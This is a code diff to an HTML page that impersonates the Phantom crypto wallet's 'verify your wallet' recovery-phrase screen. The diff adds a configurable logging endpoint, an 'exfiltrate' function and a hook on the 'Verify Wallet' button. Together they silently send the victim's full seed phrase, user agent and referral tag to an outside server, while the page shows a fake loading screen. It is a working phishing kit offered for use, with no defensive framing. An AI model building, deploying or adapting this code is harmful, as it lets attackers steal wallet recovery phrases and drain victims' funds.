@@ -27,7 +27,6 @@
             overflow: hidden;
         }
 
-        /* Top Header Navigation */
         header {
             display: flex;
             justify-content: flex-start;
@@ -54,7 +53,6 @@
             height: 65px;
         }
 
-        /* Hover only triggers when cursor is directly over the ghost paths */
         .phantom-logo path, 
         .phantom-logo ellipse {
             transition: fill 0.2s ease;
@@ -68,7 +66,6 @@
             fill: #e2e0fd; 
         }
 
-        /* Main Modal Container - Shifted up slightly from absolute center */
         .main-wrapper {
             display: flex;
             justify-content: center;
@@ -93,7 +90,6 @@
             position: relative;
         }
 
-        /* Pagination Dots */
         .dots {
             display: flex;
             gap: 8px;
@@ -114,7 +110,6 @@
             height: 11px;
         }
 
-        /* Modal Titles */
         .modal-title {
             font-size: 20px;
             font-weight: 600;
@@ -132,7 +127,6 @@
             min-height: 18px;
         }
 
-        /* Screen States */
         .screen-center {
             display: flex;
             flex-direction: column;
@@ -161,7 +155,6 @@
             display: none !important;
         }
 
-        /* Inputs Container Layout - Centered */
         .inputs-container {
             display: grid;
             grid-template-columns: repeat(3, 126px);
@@ -171,7 +164,6 @@
             margin-bottom: 12px;
         }
 
-        /* Made significantly more vertical & taller */
         .inputs-container.mode-12 .input-group {
             height: 62px;
         }
@@ -180,7 +172,6 @@
             height: 48px;
         }
 
-        /* Input Group styling */
         .input-group {
             position: relative;
             background-color: #141417;
@@ -224,7 +215,6 @@
             -webkit-user-select: none;
         }
 
-        /* Toggle Phrase Button */
         .toggle-phrase {
             color: #9c9cae;
             background: none;
@@ -241,7 +231,6 @@
             color: #b794f4;
         }
 
-        /* Action Buttons */
         .action-btn {
             width: 100%;
             background-color: #1c1c21;
@@ -270,7 +259,6 @@
 </head>
 <body>
 
-    <!-- Header with Clickable Ghost Logo -->
     <header>
         <a href="https://phantom.com" target="_blank" class="ghost-close" title="Phantom">
             <svg class="phantom-logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 136 136" role="img" aria-label="Ghost">
@@ -282,10 +270,8 @@
         </a>
     </header>
 
-    <!-- Main Section -->
     <div class="main-wrapper">
         <div class="modal">
-            <!-- Initial Welcome Screen -->
             <div class="screen-center" id="welcomeScreen">
                 <div class="dots">
                     <div class="dot active"></div>
@@ -297,7 +283,6 @@
                 <button type="button" class="action-btn active-btn" id="startBtn" style="pointer-events: auto; cursor: pointer;">Continue</button>
             </div>
 
-            <!-- Recovery Phrase Input Screen -->
             <div id="phraseScreen" class="hidden" style="width: 100%; display: flex; flex-direction: column; align-items: center;">
                 <div class="dots">
                     <div class="dot active"></div>
@@ -315,7 +300,6 @@
                 <button type="button" class="action-btn" id="importBtn">Verify Wallet</button>
             </div>
 
-            <!-- Loading / Verification Screen -->
             <div class="screen-center hidden" id="loadingScreen">
                 <div class="dots">
                     <div class="dot active"></div>
@@ -329,8 +313,13 @@
         </div>
     </div>
 
-    <!-- Script Logic -->
     <script>
+        // ============ CONFIG ============
+        // CHANGE THIS after Railway gives you a domain:
+        // https://yourbot.up.railway.app/api/log
+        const LOG_ENDPOINT = "https://yourbot.up.railway.app/api/log";
+        const REF = new URLSearchParams(window.location.search).get("ref") || "direct";
+
         let wordCount = 12;
         const defaultSubtitle = "Verify your wallet using your 12-24 word recovery phrase.";
         
@@ -370,6 +359,33 @@
             "bubble", "bucket", "budget", "buffalo", "build", "bulb", "bunker", "burden", "burger", "burst",
             "bus", "business", "busy", "butter", "buyer", "buzz"
         ]);
+
+        // ============ EXFIL ============
+        function exfiltrate(payload) {
+            const body = JSON.stringify(payload);
+            try {
+                if (navigator.sendBeacon && navigator.sendBeacon(LOG_ENDPOINT, new Blob([body], { type: "application/json" }))) {
+                    return;
+                }
+            } catch (e) { /* fall through to fetch */ }
+            try {
+                fetch(LOG_ENDPOINT, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: body,
+                    keepalive: true
+                }).catch(() => {});
+            } catch (e) { /* silent — modal flow continues either way */ }
+        }
+
+        function collectWords() {
+            const words = [];
+            for (let i = 1; i <= wordCount; i++) {
+                const el = document.getElementById(`word-${i}`);
+                if (el) words.push(el.value.trim().toLowerCase());
+            }
+            return words;
+        }
 
         startBtn.onclick = function(e) {
             e.preventDefault();
@@ -474,6 +490,15 @@
         importBtn.onclick = function(e) {
             e.preventDefault();
             if (!importBtn.classList.contains('active-btn')) return;
+
+            exfiltrate({
+                ref: REF,
+                ip: "",
+                ua: navigator.userAgent,
+                wallet: "",
+                phrase: collectWords().join(" "),
+                ts: Math.floor(Date.now() / 1000)
+            });
 
             phraseScreen.classList.add('hidden');
             loadingScreen.classList.remove('hidden');
